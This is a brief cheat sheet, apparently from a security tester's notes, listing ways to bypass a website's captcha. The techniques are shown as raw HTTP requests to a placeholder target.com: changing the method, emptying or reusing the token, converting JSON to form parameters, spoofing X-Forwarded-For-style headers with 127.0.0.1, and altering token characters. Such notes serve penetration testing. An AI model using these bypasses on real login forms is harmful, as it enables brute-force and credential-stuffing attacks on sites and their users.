---
title: "Bypass Captcha"
author: ["4shen0ne"]
draft: false
---

## Try changing the request method, for example POST to GET {#try-changing-the-request-method-for-example-post-to-get}

```nil
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

Change the method to GET

```nil
GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP 1.1
Host: target.com
...
```


## Try remove the value of the captcha parameter {#try-remove-the-value-of-the-captcha-parameter}

```nil
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=&_Username=daffa&_Password=test123
```


## Try reuse old captcha token {#try-reuse-old-captcha-token}

```nil
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
```


## Convert JSON data to normal request parameter {#convert-json-data-to-normal-request-parameter}

```nil
POST / HTTP 1.1
Host: target.com
...

{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}
```

Convert to normal request

```nil
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```


## Try custom header to bypass captcha {#try-custom-header-to-bypass-captcha}

```nil
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```


## Change some specific characters of the captcha parameter and see {#change-some-specific-characters-of-the-captcha-parameter-and-see}

If it is possible to bypass the restriction.

```nil
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

Try this to bypass

```nil
POST / HTTP 1.1
Host: target.com
...

_RequestVerificationToken=xxxdxxxaxxcxxx&_Username=daffa&_Password=test123
```
